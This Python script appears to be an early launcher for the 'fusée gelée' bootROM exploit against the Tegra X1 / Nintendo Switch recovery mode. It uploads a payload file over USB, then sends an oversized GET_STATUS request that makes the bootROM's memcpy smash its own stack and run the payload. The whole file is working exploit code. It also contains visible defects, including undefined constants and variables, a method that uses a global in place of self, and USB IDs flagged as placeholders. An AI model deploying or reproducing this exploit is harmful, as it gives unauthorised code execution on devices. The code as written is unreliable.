#!/usr/bin/env python3
#
# fusée gelée
#
# Launcher for the {re}switched coldboot/bootrom hacks--
# launches payloads above the Horizon
#
# discovery and implementation by @ktemkin
# likely independently discovered by lots of others <3
#
# special thanks to:
#    SciresM, motezazer -- guidance and support
#    hedgeberg, andeor  -- dumping the Jetson bootROM
#    TuxSH              -- for IDB notes that were nice to peek at
#

import usb
import time


# notes:
# GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
# GET_INTERFACE  to the INTERFACE triggers memcpy from 0x40003984
# GET_STATUS     to the INTERFACE triggers memcpy from <on the stack>

class RCMHax:

    # FIXME: these are the jetson's; replace me with the Switch's
    SWITCH_RCM_VID = 0x0955
    SWITCH_RCM_PID = 0X7321

    # USB constants used
    STANDARD_REQUEST_DEVICE_TO_HOST_TO_DEVICE   = 0x80
    STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT = 0x82
    GET_DESCRIPTOR    = 0x6
    GET_CONFIGURATION = 0x8

    # Interface requests
    GET_STATUS        = 0x0

    # Exploit specifics
    COPY_START_ADDRESS      = 0x40003982
    COPY_BUFFER_ADDRESSES   = [0x40005000, 0x40009000]
    STACK_END               = 0x40010000

    def __init__(self):
        """ Set up our RCM hack connection."""

        # The first write into the bootROM touches the lowbuffer.
        self.current_buffer = 0

        # Grab a connection to the USB device itself.
        self.dev = usb.core.find(idVendor=self.SWITCH_RCM_VID, idProduct=self.SWITCH_RCM_PID)

        # Keep track of the total amount written.
        self.total_written = 0

        if self.dev is None:
            raise IOError("No Switch found?")

    def get_device_descriptor(self):
        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST, self.GET_DESCRIPTOR, 1 << 8, 0, 18)

    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return self.dev.read(0x81, length, 1000)


    def write(self, data):
        """ Writes data to the main RCM protocol endpoint. """

        length = len(data)
        packet_size = 0x1000

        while length:
            data_to_transmit = min(length, packet_size)
            length -= data_to_transmit

            chunk = data[:data_to_transmit]
            data  = data[data_to_transmit:]
            self.write_single_buffer(chunk)


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be 0x1000 long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        self._toggle_buffer()
        return self.dev.write(0x01, data, 1000)


    def _toggle_buffer(self):
        """
        Toggles the active target buffer, paralleling the operation happening in
        RCM on the X1 device.
        """
        self.current_buffer = 1 - self.current_buffer


    def get_current_buffer_address(self):
        """ Returns the base address for the current copy. """
        return self.COPY_BUFFER_ADDRESSES[self.current_buffer]


    def read_device_id(self):
        """ Reads the Device ID via RCM. Only valid at the start of the communication. """
        return self.read(16)


    def switch_to_highbuf(self):
        """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """

        if switch.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
            switch.write(smash_buffer)


    def trigger_controlled_memcpy(self, length=None):
        """ Triggers the RCM vulnerability, causing it to make a signficantly-oversized memcpy. """

        # Determine how much we'd need to transmit to smash the full stack.
        if length is None:
            length = self.STACK_END - self.get_current_buffer_address()

        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)



# Get a connection to our device
switch = RCMHax()
print("Switch device id: {}".format(switch.read_device_id()))

# Prefix the image with an RCM command, so it winds up loaded into memory
# at the right location (0x40010000).

# Use the maximum length so we can transmit as much payload as we want;
# we'll take over before we get to the end.
length = 0x30298
payload = length.to_bytes(4, byteorder='little')

# pad out to 680 so the payload starts at the right address in IRAM
payload += b'\0' * (680 - len(payload))

# for now, populate from [0x40010000, 0x40020000) with the payload address,
# ensuring we smash the stack properly; we can pull this down once we figure
# out the stack frame we're actually in for sure
print("Setting ourselves up to smash the stack...")
payload_location = 0x40020000
payload_location_raw = payload_location.to_bytes(4, byteorder='little')
payload += (payload_location_raw * 16384) # TODO: remove this magic number 

# read the payload into memory
with open("payload.bin", "rb") as f:
    payload += f.read()

# pad the payload to fill a request exactly
payload_length = len(payload)
padding_size   = 0x1000 - (payload_length % 0x1000)
payload += (b'\0' * padding_size)

# send the payload
print("Uploading payload...")
switch.write(payload)

# smash less as a first test
print("Smashing the stack...")
switch.switch_to_highbuf()

try:
    switch.trigger_controlled_memcpy()
except IOError:
    print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")

